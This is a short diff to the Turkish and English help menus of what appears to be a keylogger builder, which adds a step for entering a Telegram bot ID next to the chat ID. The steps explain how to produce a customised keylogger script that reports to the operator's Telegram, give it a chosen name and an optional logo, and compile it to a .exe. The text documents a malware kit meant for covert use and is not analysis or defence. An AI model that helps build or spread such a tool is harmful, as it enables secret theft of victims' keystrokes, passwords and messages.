@@ -14,10 +14,11 @@ HELP_TEXT_TR = """
 Bu araç, kişiselleştirilmiş bir keylogger oluşturmanıza yardımcı olur.
 
 1. Telegram Chat ID'nizi girin.
-2. Keylogger dosyanız için bir isim seçin.
-3. Opsiyonel olarak bir logo ekleyebilirsiniz.
-4. Araç, düzenlenmiş keylogger dosyanızı oluşturur.
-5. Son olarak, betik bir .exe dosyasına dönüştürülür.
+2.Telegram Bot ID'nizi girin (1.ve2. adımdakileri keylogger.py dosyasından değiştirin)
+3. Keylogger dosyanız için bir isim seçin.
+4. Opsiyonel olarak bir logo ekleyebilirsiniz.
+5. Araç, düzenlenmiş keylogger dosyanızı oluşturur.
+6. Son olarak, betik bir .exe dosyasına dönüştürülür.
 
 Çıktılar:
 - Düzenlenmiş betik 'output/' klasörüne kaydedilir.
@@ -29,11 +30,12 @@ HELP_TEXT_EN = """
 ================ HELP MENU =================
 This tool helps you build a customized keylogger.
 
-1. Enter your Telegram Chat ID.
-2. Choose a filename for your keylogger script.
-3. Optionally, provide a path to a logo.
-4. The tool generates a modified keylogger script.
-5. Finally, the script is compiled into an executable file.
+1.Enter your Telegram Chat ID.
+2.Enter your Telegram Bot ID (change the values from steps 1 and 2 in the keylogger.py file).
+3.Choose a name for your keylogger script.
+4.Optionally, you can add a logo.
+5.The tool generates your modified keylogger script.
+6.Finally, the script is compiled into a .exe file.
 
 Output files:
 - The modified script is saved in the 'output/' folder.
